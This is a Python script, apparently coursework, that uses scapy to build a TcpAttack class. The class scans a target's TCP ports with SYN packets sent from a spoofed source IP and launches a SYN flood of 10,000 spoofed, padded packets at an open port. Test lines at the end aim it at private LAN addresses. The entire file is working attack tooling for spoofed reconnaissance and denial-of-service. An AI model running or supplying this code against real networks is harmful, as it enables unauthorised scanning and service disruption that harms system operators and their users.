# python 3.10.4
# David Henry - 1007604
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import sr1, send
from scapy.volatile import RandShort


class TcpAttack:
    def __init__(self, spoofIp: str, targetIp: str):
        # spoof source address
        self.spoofIp = spoofIp

        # target address
        self.targetIp = targetIp

    def scanTarget(self, rangeStart: int, rangeEnd: int, portList=True):
        """Outputs a list of ports open on the target host.
        optional flag determines if the output txt file is created
        Usage - scanTarget(50,53)"""

        # generate a random number to use as a spoofed source port
        sport = RandShort()

        # open ports found
        open_ports = list()

        if portList:
            print("Beginning scan...\n")

        # check each port in range
        for port in range(rangeStart, rangeEnd + 1):

            # create and send a packet to check if a response is given
            # sr1 returns the packet that answered the SYN that is sent
            packet = sr1(IP(src=self.spoofIp, dst=self.targetIp) / TCP(sport=sport, dport=port, flags="S"), timeout=.5,
                         verbose=0)

            # check if packet contains the syn and ack flags
            if packet is not None and packet.haslayer(TCP) and packet[TCP].flags == 18:

                # return true if checking to see if port is only open or not
                if not portList:
                    return True

                open_ports.append(port)
                print(f"Port {port} open.")

        if portList and any(open_ports):

            # write list of open ports to file
            with open("openports.txt", "w") as file:
                for port in open_ports:
                    file.writelines(str(port))

            print("Output file of open ports generated.")

        if portList and not any(open_ports):
            print("No open ports found.")

    def attackTarget(self, port: int):
        """Attempts to perform a syn attack on the target host. The port is checked beforehand to determine
        if it is open or not"""

        sport = RandShort()
        packet_size = 1024

        # create  data to be used in SYN attack
        raw = Raw(b"X" * packet_size)
        ip = IP(src=self.spoofIp, dst=self.targetIp)
        tcp = TCP(sport=sport, dport=port, flags="S")

        # create the packet
        packet = ip / tcp / raw

        # check if the port is open before sending
        if self.scanTarget(port, port, False):
            packet_count = 10000

            print(f"Port {port} open.\nStarting attack.")

            send(packet, verbose=0, count=packet_count)

            print(f"Sent {packet_count} packets to {self.targetIp} on port {port}.")

            # return true after attack executes
            return True


# --- testing ---#
spoofIP = "192.168.1.12"
targetIP = "192.168.1.1"
rangeStart = 50
rangeEnd = 80
port = 80
Tcp = TcpAttack(spoofIP, targetIP)
Tcp.scanTarget(rangeStart, rangeEnd)
# if Tcp.attackTarget(port):
#     print('port was open to attack')
